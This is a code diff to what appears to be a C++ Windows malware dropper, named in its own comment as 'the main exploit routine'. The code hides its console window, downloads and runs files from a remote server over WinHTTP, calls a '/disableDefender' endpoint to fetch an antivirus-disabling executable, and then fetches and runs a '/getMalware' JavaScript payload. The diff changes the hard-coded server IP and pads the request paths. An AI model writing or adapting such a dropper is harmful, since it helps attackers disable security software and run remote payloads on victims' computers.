@@ -105,7 +105,7 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 	}
 
 	// Step 2: Connect to the server
-	HINTERNET hConnect = WinHttpConnect(hSession, L"42.96.42.99", 8082, 0);
+	HINTERNET hConnect = WinHttpConnect(hSession, L"255.255.255.255", 8082, 0);
 	if (hConnect == NULL) {
 		std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
 		WinHttpCloseHandle(hSession);
@@ -192,8 +192,11 @@ char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {
 
 /* the main exploit routine */
 int main(int argc, char* argv[])
-{
-	std::thread thread1(downloadAndRun, L"/getpdf", L".pdf", true);
+{	
+	HWND hWnd = GetConsoleWindow();
+	ShowWindow(hWnd, SW_HIDE);
+	//std::thread thread1(downloadAndRun, L"/getpdf", L".pdf", true);
+	std::thread thread1(downloadAndRun, L"/getpdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", L".pdf", true);
 	char* pathDisableMalware =downloadAndRun(L"/disableDefender",L".exe",false);
 	//cout << pathDisableMalware;
 	if (pathDisableMalware == NULL) {
@@ -323,7 +326,8 @@ int main(int argc, char* argv[])
 	}
 	*/
 	
-	char* pathMalware = downloadAndRun(L"/getMalware", L".js", true);
+	//char* pathMalware = downloadAndRun(L"/getMalware", L".js", true);
+	char* pathMalware = downloadAndRun(L"/getMalwareeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee", L".js", true);
 	//cout << pathMalware;
 	if (pathMalware == NULL) {
 		cout << "Do not have pathMalware";
